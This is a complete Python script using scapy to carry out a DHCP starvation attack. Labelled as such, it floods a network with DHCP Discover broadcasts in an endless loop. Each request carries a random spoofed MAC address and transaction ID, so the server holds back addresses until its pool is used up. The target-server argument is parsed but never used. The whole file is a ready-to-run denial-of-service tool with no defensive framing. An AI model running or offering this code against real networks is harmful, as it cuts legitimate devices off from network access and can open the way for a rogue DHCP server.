import argparse
import scapy.all as scapy
import random

def generateRandomMac():
    # Generate a random MAC address
    mac = [random.choice('0123456789ABCDEF') for _ in range(12)]
    mac = ''.join(mac)
    mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
    return mac

def sendDhcpDiscover(mac, interface, xid):
    # Send DHCP Discover packet
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Ethernet broadcast to target all devices
    ip = scapy.IP(src="0.0.0.0", dst="255.255.255.255")  # IP broadcast to reach all devices on the network
    udp = scapy.UDP(sport=68, dport=67)  # Source and destination ports for DHCP communication
    bootp = scapy.BOOTP(op=1, xid=xid, chaddr=mac.replace(":", "")) # DHCP operation code 1 (Boot Request) and random transaction ID and MAC
    dhcp = scapy.DHCP(options=[("message-type", "discover"), "end"]) #DHCP discover message
    packet = ether / ip / udp / bootp / dhcp  # Combine the layers to form the complete packet
    scapy.sendp(packet, iface=interface, verbose=0)
       
def starvation(serverIP, interface):
    while True:
        mac = generateRandomMac()
        
        # setting up xid for each since for some reason it was defaulting to 0 
        xid = random.randint(1, 0xffffffff)  # Generate a random xid between 1 and 0xffffffff 
    
        # Step 1: DHCP Discover - the offers will be sent from server, keeping all IPs on hold
        sendDhcpDiscover(mac, interface, xid)
    

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description="DHCP Starvation", add_help=True) #

    parser.add_argument("-i", "--iface", help="Interface you wish to use")
    parser.add_argument("-t", "--target", help="IP of target server", type=str)

    args = parser.parse_args()
    
    starvation(args.target, args.iface)


